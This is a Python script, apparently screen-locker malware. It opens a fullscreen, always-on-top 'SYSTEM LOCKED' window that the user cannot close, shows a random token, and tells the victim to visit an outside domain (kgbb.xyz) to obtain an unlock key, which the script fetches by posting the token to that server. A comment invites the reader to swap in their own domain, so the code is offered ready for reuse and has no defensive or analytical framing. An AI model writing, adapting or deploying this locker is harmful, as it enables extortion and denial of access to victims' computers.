import os
import sys
import tkinter as tk
from tkinter import messagebox
import ctypes
import time
import threading
import requests
import random
import string
from datetime import datetime, timedelta

# --- SETTINGS ---
API_URL = "https://kgbb.xyz"  # <<< CHANGE THIS TO YOUR DOMAIN!

# --- CONSTANTS ---
RED_ALERT = "#ff0000"
CYBER_FONT = "Courier New"

def generate_token(length=16):
    """Generate random token"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

class SystemLocker:
    def __init__(self):
        self.token = generate_token()
        self.unlock_key = None

        self.root = tk.Tk()
        self.setup_gui()
        self.root.mainloop()

    def setup_gui(self):
        self.root.title("⛔ SYSTEM LOCKED ⛔")
        self.root.configure(bg='black')
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.protocol("WM_DELETE_WINDOW", self.deny_close)

        container = tk.Frame(self.root, bg='black')
        container.place(relx=0.5, rely=0.5, anchor='center')

        tk.Label(container, text="⚠️ SYSTEM LOCKED ⚠️", bg='black', fg=RED_ALERT,
                 font=(CYBER_FONT, 28, 'bold')).pack(pady=(0, 20))

        tk.Label(container, text=f"🔗 GO TO https://kgbb.xyz 🔗", bg='black', fg='white',
                 font=(CYBER_FONT, 16)).pack(pady=(0, 10))

        tk.Label(container, text=f"Paste this CODE:", bg='black', fg='white',
                 font=(CYBER_FONT, 14)).pack(pady=(20, 0))

        tk.Label(container, text=f"{self.token}", bg='black', fg=RED_ALERT,
                 font=(CYBER_FONT, 24, 'bold')).pack(pady=(0, 30))

        tk.Label(container, text="Paste UNLOCK KEY below:", bg='black', fg='white',
                 font=(CYBER_FONT, 14)).pack(pady=(10, 10))

        self.key_entry = tk.Entry(container, show="*", font=(CYBER_FONT, 20),
                                  bg='#111111', fg='white', width=25, justify='center')
        self.key_entry.pack(pady=(0, 20))

        tk.Button(container, text="✅ [SUBMIT] ✅", command=self.validate_key,
                  bg='black', fg=RED_ALERT, font=(CYBER_FONT, 16, 'bold')).pack()

    def deny_close(self):
        pass  # Prevent window close

    def validate_key(self):
        entered_key = self.key_entry.get().strip()

        if not self.unlock_key:
            # First time: Contact server
            try:
                response = requests.post(API_URL, json={"token": self.token}, timeout=10)
                data = response.json()
                self.unlock_key = data.get("unlock_key")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to contact server:\n{e}")
                return

        if entered_key == self.unlock_key:
            self.root.destroy()
        else:
            messagebox.showerror("Invalid", "❌ Incorrect Unlock Key!")

# --- MAIN ---
if __name__ == "__main__":
    app = SystemLocker()
